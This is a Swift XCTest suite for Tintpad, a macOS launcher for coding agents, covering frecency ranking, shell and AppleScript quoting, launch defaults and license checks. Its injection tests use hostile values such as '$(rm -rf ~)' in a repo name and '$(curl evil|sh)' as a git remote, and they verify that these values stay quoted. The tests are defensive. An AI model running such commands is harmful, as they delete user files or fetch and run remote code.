import XCTest
@testable import Tintpad

final class FrecencyTests: XCTestCase {
    func testDecayHalvesAfterOneHalfLife() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 1_000_000)
        repo.frecencyScore = 8
        repo.lastLaunchedAt = now
        let later = now.addingTimeInterval(86_400 * 10) // 10 days = one half-life
        let decayed = Frecency.decayedScore(repo, now: later, halfLifeDays: 10)
        XCTAssertEqual(decayed, 4, accuracy: 0.001)
    }

    func testEqualScoresBreakTieByRecencyThenName() {
        let now = Date(timeIntervalSince1970: 1_000_000)
        // Equal score (0, never launched) → sort by name.
        var c = Repo(path: "/c", name: "charlie")
        var a = Repo(path: "/a", name: "alpha")
        let ordered = Frecency.ordered([c, a], now: now, halfLifeDays: 30)
        XCTAssertEqual(ordered.map(\.name), ["alpha", "charlie"])
        // Same score but one launched more recently → it comes first.
        a.frecencyScore = 1; a.lastLaunchedAt = now.addingTimeInterval(-100)
        c.frecencyScore = 1; c.lastLaunchedAt = now.addingTimeInterval(-10)
        XCTAssertEqual(Frecency.ordered([a, c], now: now, halfLifeDays: 30).map(\.name), ["charlie", "alpha"])
    }

    // Guards the arrow-nav-jumping regression: the list order must not change as
    // time ticks (a non-transitive epsilon comparator made it reshuffle per render).
    func testOrderingStableAcrossTimeJitter() {
        let now = Date(timeIntervalSince1970: 2_000_000)
        var repos = ["alpha", "bravo", "charlie", "delta", "echo"].map { Repo(path: "/\($0)", name: $0) }
        repos[1].frecencyScore = 3; repos[1].lastLaunchedAt = now.addingTimeInterval(-3600)
        repos[3].frecencyScore = 3; repos[3].lastLaunchedAt = now.addingTimeInterval(-3600) // ties bravo
        let a = Frecency.ordered(repos, now: now, halfLifeDays: 30).map(\.name)
        let b = Frecency.ordered(repos, now: now.addingTimeInterval(1.5), halfLifeDays: 30).map(\.name)
        XCTAssertEqual(a, b, "frecency order must be stable as time advances")
    }

    // A future-dated anchor (clock rollback, restored backup) must decay to
    // at most the stored score, never amplify it.
    func testFutureDatedAnchorDoesNotInflate() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 1_000_000)
        repo.frecencyScore = 2
        repo.lastLaunchedAt = now.addingTimeInterval(86_400 * 30)   // 30 days ahead
        XCTAssertEqual(Frecency.decayedScore(repo, now: now, halfLifeDays: 10), 2, accuracy: 0.001)
    }

    func testRecordVisitIncrementsAndReanchors() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 2_000_000)
        Frecency.recordVisit(&repo, now: now, halfLifeDays: 30)
        XCTAssertEqual(repo.launchCount, 1)
        XCTAssertEqual(repo.frecencyScore, 1, accuracy: 0.001)
        XCTAssertEqual(repo.lastLaunchedAt, now)
        // Same-instant second visit accumulates to 2.
        Frecency.recordVisit(&repo, now: now, halfLifeDays: 30)
        XCTAssertEqual(repo.frecencyScore, 2, accuracy: 0.001)
    }
}

final class CommandTemplateTests: XCTestCase {
    private func ctx(mode: RunMode, prompt: String?) -> CommandTemplate.Context {
        CommandTemplate.Context(repo: Repo(path: "/Users/me/acme", name: "acme"),
                                mode: mode, prompt: prompt, branch: "main", remote: nil)
    }

    func testModeAndNameSubstitution() {
        let yolo = RunMode(name: "YOLO", flags: "--dangerously-skip-permissions", isDangerous: true, description: "")
        let out = CommandTemplate.preview("claude {mode}", context: ctx(mode: yolo, prompt: nil))
        XCTAssertEqual(out, "claude --dangerously-skip-permissions")
    }

    func testEmptyModeCollapsesSpaces() {
        let out = CommandTemplate.preview("claude {mode} {prompt}", context: ctx(mode: .defaultMode(), prompt: nil))
        XCTAssertEqual(out, "claude")
    }

    // The empty-slot cleanup must never rewrite spaces inside quoted values:
    // "/Users/me/my  repo" is a legal path and must survive verbatim.
    func testDoubleSpacesInsideQuotedValuesSurvive() {
        let repo = Repo(path: "/Users/me/my  repo", name: "my  repo")
        let c = CommandTemplate.Context(repo: repo, mode: .defaultMode(),
                                        prompt: "fix  this", branch: nil, remote: nil)
        let out = CommandTemplate.preview("cd {repoPath} && claude {mode} {prompt}", context: c)
        XCTAssertEqual(out, "cd '/Users/me/my  repo' && claude 'fix  this'")
    }

    func testPromptIsQuoted() {
        let out = CommandTemplate.preview("claude {prompt}", context: ctx(mode: .defaultMode(), prompt: "fix bug"))
        XCTAssertEqual(out, "claude 'fix bug'")
    }

    func testRepoNameAndPathQuoted() {
        let out = CommandTemplate.preview("cd {repoPath} # {repoName}", context: ctx(mode: .defaultMode(), prompt: nil))
        XCTAssertEqual(out, "cd '/Users/me/acme' # 'acme'")
    }

    // S1: an adversarial repo/branch name cannot escape the single-quoted argument.
    func testInjectionViaRepoNameNeutralized() {
        var repo = Repo(path: "/x", name: "$(rm -rf ~); echo pwned")
        let c = CommandTemplate.Context(repo: repo, mode: .defaultMode(), prompt: nil, branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {repoName}", context: c)
        XCTAssertEqual(out, "claude '$(rm -rf ~); echo pwned'")
        XCTAssertFalse(out.contains("') ") || out.contains("';"))  // no quote-break
        _ = repo
    }

    func testSingleQuoteInValueEscaped() {
        let c = CommandTemplate.Context(repo: Repo(path: "/x", name: "x"),
                                        mode: .defaultMode(), prompt: "it's fine", branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {prompt}", context: c)
        XCTAssertEqual(out, "claude 'it'\\''s fine'")
    }

    // S2: newlines/control chars are stripped so they can't submit early or break AppleScript.
    func testNewlinesStrippedFromPrompt() {
        let c = CommandTemplate.Context(repo: Repo(path: "/x", name: "x"),
                                        mode: .defaultMode(), prompt: "line1\nrm -rf ~\ttab", branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {prompt}", context: c)
        XCTAssertFalse(out.contains("\n"))
        XCTAssertFalse(out.contains("\t"))
        XCTAssertEqual(out, "claude 'line1 rm -rf ~ tab'")
    }

    // S2: a .git/HEAD or .git/config with adversarial content flows into {branch}/{remote};
    // both must be single-quoted just like repo path/name.
    func testBranchAndRemoteQuoted() {
        let c = CommandTemplate.Context(
            repo: Repo(path: "/x", name: "x"), mode: .defaultMode(), prompt: nil,
            branch: "a'; rm -rf ~ #", remote: "$(curl evil|sh)", worktreePath: nil)
        let out = CommandTemplate.preview("claude --branch {branch} --remote {remote}", context: c)
        // The injected `'` is escaped as '\'' so the rm/curl payloads stay inside single quotes.
        XCTAssertEqual(out, "claude --branch 'a'\\''; rm -rf ~ #' --remote '$(curl evil|sh)'")
    }
}

// S2: the AppleScript escaping layer (iTerm2 / Terminal.app `do script "…"`) was untested.
final class AppleScriptEscapeTests: XCTestCase {
    func testDoubleQuoteEscaped() {
        XCTAssertEqual(appleScriptEscape("say \"hi\""), "say \\\"hi\\\"")
    }

    func testBackslashEscapedBeforeQuote() {
        // A backslash-then-quote must become \\ then \" — not \\" (which would be backslash + literal quote).
        XCTAssertEqual(appleScriptEscape("a\\\"b"), "a\\\\\\\"b")
    }

    func testNewlineAndCarriageReturnCollapsed() {
        XCTAssertEqual(appleScriptEscape("a\nb\rc"), "a b c")
        XCTAssertFalse(appleScriptEscape("x\ny").contains("\n"))
    }

    // End-to-end: an adversarial branch survives shell single-quoting, then the assembled
    // `cd 'wd' && cmd` is AppleScript-escaped with no unescaped double quote left to break the literal.
    func testEndToEndShellThenAppleScriptNoUnescapedQuote() {
        let c = CommandTemplate.Context(
            repo: Repo(path: "/Users/me/acme", name: "acme"), mode: .defaultMode(),
            prompt: "say \"done\"", branch: "a\"b", remote: nil, worktreePath: nil)
        let command = CommandTemplate.preview("claude --branch {branch} {prompt}", context: c)
        let assembled = "cd '/Users/me/acme' && \(command)"
        let escaped = appleScriptEscape(assembled)
        // Every literal double quote in the assembled command must be backslash-escaped.
        var prev: Character = " "
        for ch in escaped {
            if ch == "\"" { XCTAssertEqual(prev, "\\", "unescaped double quote in AppleScript literal: \(escaped)") }
            prev = ch
        }
    }
}

final class LaunchDefaultsTests: XCTestCase {
    private let safe = RunMode(name: "Safe", flags: "", isDangerous: false, description: "")
    private let def = RunMode.defaultMode()
    private let yolo = RunMode(name: "YOLO", flags: "--yolo", isDangerous: true, description: "")

    private func makeAgent(_ name: String) -> Agent {
        Agent(name: name, commandTemplate: "\(name) {mode}", acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: [safe, def, yolo], defaultModeID: def.id)
    }

    func testPinnedModeWinsOverLastUsedAndAgentDefault() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.defaultModeID = yolo.id
        repo.lastModeID = safe.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, yolo.id)
    }

    func testLastUsedModeWinsOverAgentDefault() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastModeID = yolo.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, yolo.id)
    }

    func testStaleLastModeFromAnotherAgentFallsThrough() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastModeID = UUID()   // a mode that belongs to no current agent
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, def.id)
    }

    func testOverrideBeatsEverything() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.defaultModeID = yolo.id
        repo.lastModeID = yolo.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent, overrideID: safe.id).id, safe.id)
    }

    func testAgentPrecedencePinnedThenLastUsedThenFirst() {
        let claude = makeAgent("claude")
        let codex = makeAgent("codex")
        var repo = Repo(path: "/x", name: "x")
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, claude.id)
        repo.lastAgentID = codex.id
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, codex.id)
        repo.defaultAgentID = claude.id
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, claude.id)
    }

    func testRemovedLastAgentFallsBackToFirst() {
        let claude = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastAgentID = UUID()   // agent since deleted
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude])?.id, claude.id)
    }
}

final class LaunchResolutionTests: XCTestCase {
    private func agent(_ template: String) -> Agent {
        Agent(name: "T", commandTemplate: template, acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: [.defaultMode()], defaultModeID: nil)
    }

    func testMakeLaunchResolvesCommandAndWorkingDir() throws {
        // A "/"-prefixed binary is trusted as-is, so resolution is deterministic.
        let mode = RunMode(name: "YOLO", flags: "--go", isDangerous: true, description: "")
        var s = Settings(); s.openInNewTab = false
        let launch = try LaunchService.makeLaunch(
            repo: Repo(path: "/tmp/acme", name: "acme"), agent: agent("/bin/echo {mode} {prompt}"),
            mode: mode, prompt: "fix it", worktreePath: nil, settings: s)
        XCTAssertEqual(launch.workingDirectory, "/tmp/acme")
        XCTAssertEqual(launch.command,
                       CommandTemplate.inFreshSession("/bin/echo --go 'fix it'"))
        XCTAssertFalse(launch.openInTab)
    }

    func testMakeLaunchHonorsTabSettingAndWorktree() throws {
        var s = Settings(); s.openInNewTab = true
        let launch = try LaunchService.makeLaunch(
            repo: Repo(path: "/tmp/acme", name: "acme"), agent: agent("/bin/echo"),
            mode: .defaultMode(), prompt: nil, worktreePath: "/tmp/wt/feature", settings: s)
        XCTAssertTrue(launch.openInTab)
        XCTAssertEqual(launch.workingDirectory, "/tmp/wt/feature")
        XCTAssertEqual(launch.command, CommandTemplate.inFreshSession("/bin/echo"))
    }
}

final class FreshSessionTests: XCTestCase {
    // Hardcoded on purpose: changing the marker list should be a conscious
    // decision, not a refactor side effect.
    func testFreshSessionUnsetsExactlyTheSessionMarkers() {
        XCTAssertEqual(
            CommandTemplate.inFreshSession("/bin/echo hi"),
            "env -u CLAUDECODE -u CLAUDE_CODE_CHILD_SESSION -u CLAUDE_CODE_SESSION_ID"
                + " -u CLAUDE_PID -u CLAUDE_CODE_ENTRYPOINT /bin/echo hi")
    }

    func testScrubDropsMarkersAndKeepsDeliberateConfig() {
        let env = ShellEnvironment.scrubSessionMarkers([
            "CLAUDECODE": "1",
            "CLAUDE_CODE_CHILD_SESSION": "1",
            "ANTHROPIC_API_KEY": "sk-x",
            "CLAUDE_CONFIG_DIR": "/x",
            "PATH": "/usr/bin",
        ])
        XCTAssertNil(env["CLAUDECODE"])
        XCTAssertNil(env["CLAUDE_CODE_CHILD_SESSION"])
        XCTAssertEqual(env["ANTHROPIC_API_KEY"], "sk-x")
        XCTAssertEqual(env["CLAUDE_CONFIG_DIR"], "/x")
        XCTAssertEqual(env["PATH"], "/usr/bin")
    }

    // The prefix must survive the adapters' `cd … && cmd` chains as one simple
    // command: the marker is really unset, and a failed cd still short-circuits.
    func testFreshSessionCommandBehavesInShellChain() throws {
        let probe = CommandTemplate.inFreshSession("printenv CLAUDE_CODE_CHILD_SESSION")
        let dirty = ["CLAUDE_CODE_CHILD_SESSION": "1", "PATH": "/usr/bin:/bin"]
        let unset = try ProcessRunner.run(
            "/bin/sh", arguments: ["-c", "cd /tmp && \(probe)"],
            environment: dirty, timeout: 10)
        XCTAssertEqual(unset.stdout, "")   // printenv prints nothing when unset
        XCTAssertNotEqual(unset.status, 0)

        let skipped = try ProcessRunner.run(
            "/bin/sh", arguments: ["-c", "cd /nonexistent-tintpad && \(CommandTemplate.inFreshSession("echo ran"))"],
            environment: dirty, timeout: 10)
        XCTAssertFalse(skipped.stdout.contains("ran"))
    }
}

final class ErrorMessageTests: XCTestCase {
    func testFriendlyLocalizedDescriptions() {
        XCTAssertEqual((TerminalLaunchError.notInstalled as LocalizedError).errorDescription,
                       "That terminal isn't installed.")
        // A permission error keeps its short summary and full remedy joined,
        // and carries the pane so the palette can open it on ⏎.
        let permission = TerminalLaunchError.permissionNeeded(
            summary: "Ghostty needs Accessibility",
            remedy: "Grant Tintpad in System Settings.",
            pane: .accessibility)
        XCTAssertEqual((permission as LocalizedError).errorDescription,
                       "Ghostty needs Accessibility. Grant Tintpad in System Settings.")
        if case .permissionNeeded(_, _, let pane) = permission {
            XCTAssertEqual(pane, .accessibility)
        } else {
            XCTFail("pattern match lost the pane")
        }
        let resolve = CommandTemplate.ResolveError.binaryNotFound("claude")
        XCTAssertEqual((resolve as LocalizedError).errorDescription,
                       "“claude” isn’t on your PATH, check it’s installed, then Re-scan.")
        // No raw "error N" Swift boilerplate leaks through.
        XCTAssertFalse((resolve as Error).localizedDescription.contains("error "))
    }
}

final class LicenseTests: XCTestCase {
    // The sample Pro key signed by the embedded public key (see secrets/).
    private let validKey = "eyJlbWFpbCI6ImVyaWtAc29ya2lsYS5jb20iLCJwbGFuIjoicHJvIiwiaWF0IjoxNzUwMDAwMDAwfQ==.HqALR7nuRgB6AeUq7daHFd33+ESLZn2qdMbMaKk1FwoIAACRxgs5rSXdkG2A2bxPXGJ4g1jRCNrQJ2LS08DeCQ=="

    func testValidKeyAccepted() {
        let info = LicenseManager.verify(validKey)
        XCTAssertEqual(info?.plan, "pro")
        XCTAssertEqual(info?.email, "erik@sorkila.com")
    }

    func testNilAndGarbageRejected() {
        XCTAssertNil(LicenseManager.verify(nil))
        XCTAssertNil(LicenseManager.verify(""))
        XCTAssertNil(LicenseManager.verify("not-a-key"))
        XCTAssertNil(LicenseManager.verify("a.b"))
    }

    func testTamperedSignatureRejected() {
        var bad = validKey
        let dot = bad.firstIndex(of: ".")!
        let after = bad.index(after: dot)
        bad.replaceSubrange(after...after, with: bad[after] == "H" ? "I" : "H")
        XCTAssertNil(LicenseManager.verify(bad))
    }
}

final class GitInfoTests: XCTestCase {
    func testParsesBranchAndRemote() throws {
        let dir = NSTemporaryDirectory() + "tintpad-gittest-\(UUID().uuidString)"
        let git = dir + "/.git"
        try FileManager.default.createDirectory(atPath: git, withIntermediateDirectories: true)
        try "ref: refs/heads/feature/x\n".write(toFile: git + "/HEAD", atomically: true, encoding: .utf8)
        try """
        [core]
            bare = false
        [remote "origin"]
            url = git@github.com:me/acme.git
        """.write(toFile: git + "/config", atomically: true, encoding: .utf8)

        let meta = GitInfo.read(at: dir)
        XCTAssertEqual(meta.branch, "x")  // last path component of refs/heads/feature/x
        XCTAssertEqual(meta.remoteURL, "git@github.com:me/acme.git")
        try? FileManager.default.removeItem(atPath: dir)
    }
}

final class GitStatusTests: XCTestCase {
    private func sh(_ args: [String], cwd: String) {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/git")
        p.arguments = args
        p.currentDirectoryURL = URL(fileURLWithPath: cwd)
        try? p.run(); p.waitUntilExit()
    }

    func testCleanDirtyAndNonRepo() throws {
        try XCTSkipUnless(FileManager.default.isExecutableFile(atPath: "/usr/bin/git"))
        let dir = NSTemporaryDirectory() + "tintpad-dirty-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: dir) }

        // Not a repo yet → unknown, never a guess.
        XCTAssertNil(GitStatus.isDirty(at: dir))

        sh(["init", "-q"], cwd: dir)
        sh(["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"], cwd: dir)
        XCTAssertEqual(GitStatus.isDirty(at: dir), false)

        // An untracked file counts as dirty — that is what the working tree shows.
        FileManager.default.createFile(atPath: dir + "/new.txt", contents: Data("x".utf8))
        XCTAssertEqual(GitStatus.isDirty(at: dir), true)
    }
}

final class RepoDiscoveryTests: XCTestCase {
    func testFindsGitRepos() throws {
        let root = NSTemporaryDirectory() + "tintpad-disc-\(UUID().uuidString)"
        let repo = root + "/myrepo"
        try FileManager.default.createDirectory(atPath: repo + "/.git", withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: root + "/not-a-repo", withIntermediateDirectories: true)

        let found = RepoDiscovery.scan(roots: [root])
        XCTAssertTrue(found.contains { $0.hasSuffix("/myrepo") })
        XCTAssertFalse(found.contains { $0.hasSuffix("/not-a-repo") })
        try? FileManager.default.removeItem(atPath: root)
    }
}

final class MonogramTests: XCTestCase {
    func testUnambiguousNamesGetOneLetter() {
        XCTAssertEqual(Monogram.assign(["Gemini", "Aider", "Codex"]), ["G", "A", "C"])
    }

    func testCollidingNamesGrowAndNonCollidingStaySingle() {
        // Only the C's collide; Gemini keeps its clean single letter.
        let out = Monogram.assign(["Claude Code", "Codex", "Gemini"])
        XCTAssertEqual(out[2], "G")
        XCTAssertNotEqual(out[0], out[1])
        XCTAssertEqual(Set(out).count, 3)
    }

    func testSingleWordCollisionUsesFirstTwoLetters() {
        let out = Monogram.assign(["Codex", "Coder"])
        XCTAssertEqual(Set(out).count, 2, "shared 'Co' prefix must still resolve")
    }

    func testAssignmentIsStableAndOrderPreserving() {
        let names = ["Claude Code", "Codex", "Cursor"]
        XCTAssertEqual(Monogram.assign(names), Monogram.assign(names))
        XCTAssertEqual(Monogram.assign(names).count, names.count)
    }

    func testLeadingNonLettersAndEmptyNames() {
        XCTAssertEqual(Monogram.assign(["  opencode"]), ["O"])
        XCTAssertEqual(Monogram.assign(["!!!"]), ["?"])
    }

    func testOfMatchesAssignForTheSameSet() {
        let names = ["Claude Code", "Codex", "Gemini"]
        let all = Monogram.assign(names)
        for (i, n) in names.enumerated() {
            XCTAssertEqual(Monogram.of(n, in: names), all[i])
        }
    }
}

final class ModeVocabularyTests: XCTestCase {
    // Old stores carried invented names (Safe/YOLO). Migration renames only
    // untouched seeds (name AND flags match), preserves IDs, and never
    // clobbers user-customized vocabulary.
    func testSeedModesMigrateToAgentVocabulary() {
        var claude = AgentSeed.claudeCode
        claude.modes = [
            RunMode(name: "Safe", flags: "", isDangerous: false, description: ""),
            RunMode(name: "YOLO", flags: "--dangerously-skip-permissions", isDangerous: true, description: ""),
        ]
        var codex = AgentSeed.codex
        codex.modes = [
            RunMode(name: "Safe", flags: "--ask-for-approval untrusted", isDangerous: false, description: ""),
            RunMode(name: "YOLO", flags: "--dangerously-bypass-approvals-and-sandbox", isDangerous: true, description: ""),
        ]
        let oldID = claude.modes[1].id
        let migrated = AgentSeed.migrateModeNames([claude, codex])
        XCTAssertEqual(migrated[0].modes[1].name, "Skip permissions")
        XCTAssertEqual(migrated[0].modes[1].id, oldID, "IDs survive, so pins and memory survive")
        XCTAssertEqual(migrated[0].modes[0].name, "Safe", "no rename rule matched — untouched")
        XCTAssertEqual(migrated[1].modes[0].name, "Untrusted")
        XCTAssertEqual(migrated[1].modes[1].name, "Full access")
    }

    func testCustomizedNamesAreNeverClobbered() {
        var agent = AgentSeed.claudeCode
        agent.modes = [RunMode(name: "YOLO", flags: "--my-custom-flag", isDangerous: true, description: "")]
        XCTAssertEqual(AgentSeed.migrateModeNames([agent])[0].modes[0].name, "YOLO")
    }
}

final class RepoTintTests: XCTestCase {
    func testHueIsDeterministicAndInRange() {
        for name in ["Tintpad", "Kuta", "Velm", "SB3K", "The Prototype Lab"] {
            let h = RepoTint.hue(for: name)
            XCTAssertEqual(h, RepoTint.hue(for: name), "hue must be stable")
            XCTAssertGreaterThanOrEqual(h, 20)
            XCTAssertLessThan(h, 340, "danger-red band is reserved")
        }
    }

    func testCaseInsensitive() {
        XCTAssertEqual(RepoTint.hue(for: "Kuta"), RepoTint.hue(for: "kuta"))
    }

    func testShortNames() {
        XCTAssertEqual(RepoTint.shortName(for: "Kuta"), "KUTA")       // fits whole
        XCTAssertEqual(RepoTint.shortName(for: "SB3K"), "SB3K")
        XCTAssertEqual(RepoTint.shortName(for: "Tintpad"), "TIN")     // prefix
        XCTAssertEqual(RepoTint.shortName(for: "The Prototype Lab"), "TPL")  // initials
        XCTAssertEqual(RepoTint.shortName(for: "my-cool-repo"), "MCR")
        XCTAssertEqual(RepoTint.shortName(for: ""), "?")
    }
}

final class KeyPolicyTests: XCTestCase {
    func testTabIsOursWhenNoAssistiveTechIsActive() {
        XCTAssertFalse(KeyPolicy.tabShouldTraverse(voiceOver: false, fullKeyboardAccess: false),
                       "⇥ should still cycle agents for ordinary keyboard use")
    }

    func testVoiceOverReclaimsTab() {
        XCTAssertTrue(KeyPolicy.tabShouldTraverse(voiceOver: true, fullKeyboardAccess: false))
    }

    func testFullKeyboardAccessReclaimsTab() {
        XCTAssertTrue(KeyPolicy.tabShouldTraverse(voiceOver: false, fullKeyboardAccess: true))
    }
}

/// `Scripts/uitest.sh` drives the real GUI and can only assert on side effects,
/// so its whole mode-cycle journey rests on one assumption: the marker template
/// `echo "[{mode}]" > …` writes the *flags of the mode that actually ran*. That
/// assumption lives in a shell script no CI job runs, and it would break
/// silently if `{mode}` ever started being quoted or space-collapsed. Pin it
/// here, where it costs nothing and fails loudly.
final class UITestHarnessContractTests: XCTestCase {
    private static let markerTemplate = #"touch /tmp/tp_A; echo "[{mode}]" > /tmp/tp_A_flags"#

    private func render(flags: String) -> String {
        CommandTemplate.preview(
            Self.markerTemplate,
            context: .init(repo: Repo(path: "/tmp/tintpad-uitest", name: "tintpad-uitest"),
                           mode: RunMode(name: "M", flags: flags, isDangerous: false, description: ""),
                           prompt: nil, branch: nil, remote: nil))
    }

    func testCycledModeFlagsReachTheMarker() {
        // What J4 greps for. The brackets matter: they keep `{mode}` off a space
        // boundary, so the empty-slot cleanup can't eat the surrounding text.
        XCTAssertTrue(render(flags: "--test-danger").contains("[--test-danger]"))
    }

    func testDefaultModeWritesAnEmptyMarker() {
        // And the Default mode must be distinguishable from it, or J4 would pass
        // whether or not ⇧⇥ did anything at all.
        XCTAssertTrue(render(flags: "").contains("[]"))
        XCTAssertFalse(render(flags: "").contains("--test-danger"))
    }
}

/// The tolerant decoder is load-bearing doctrine: a store that fails to decode
/// is a store that gets reseeded, which silently throws away the user's repos,
/// agents, and license. It had no coverage, so these pin the three ways a real
/// store.json drifts from the current struct.
final class SettingsDecodeTests: XCTestCase {
    private func decode(_ json: String) throws -> Settings {
        try JSONDecoder().decode(Settings.self, from: Data(json.utf8))
    }

    func testMissingKeysFallBackToDefaults() throws {
        // Adding a field must never invalidate an existing store.
        let s = try decode("{}")
        XCTAssertEqual(s.frecencyHalfLifeDays, 30)
        XCTAssertEqual(s.tintedChips, true)
        XCTAssertEqual(s.rootScanFolders, [])
        XCTAssertNil(s.licenseKey)
    }

    func testRetiredAndUnknownKeysDecodeAndDoNotDisturbTheRest() throws {
        // Keys from a future build, and from features since retired, must ride
        // along harmlessly rather than throwing the whole store away.
        let s = try decode("""
        {"frecencyHalfLifeDays":7,"somethingFromALaterVersion":{"nested":true},"panelWidth":900}
        """)
        XCTAssertEqual(s.frecencyHalfLifeDays, 7)
        XCTAssertEqual(s.tintedChips, true, "an unknown sibling key must not disturb defaults")
    }

    func testWronglyTypedValueFallsBackInsteadOfThrowing() throws {
        // A hand-edited or half-written store shouldn't cost the user everything.
        let s = try decode("""
        {"frecencyHalfLifeDays":"thirty","confirmDangerousModes":true}
        """)
        XCTAssertEqual(s.frecencyHalfLifeDays, 30)
        XCTAssertTrue(s.confirmDangerousModes, "a bad neighbor must not take valid keys with it")
    }

    // The accent and the theme picker are both retired, and their fields survive
    // only to round-trip. If either is ever deleted outright, this fails and the
    // deleter has to decide consciously to drop the stored value.
    func testRetiredAppearanceValuesRoundTrip() throws {
        let s = try decode("""
        {"tintAccent":"teal","appearance":"light"}
        """)
        XCTAssertEqual(s.tintAccent, .teal)
        XCTAssertEqual(s.appearance, .light)
        let again = try JSONDecoder().decode(Settings.self, from: JSONEncoder().encode(s))
        XCTAssertEqual(again.tintAccent, .teal)
        XCTAssertEqual(again.appearance, .light)
    }
}
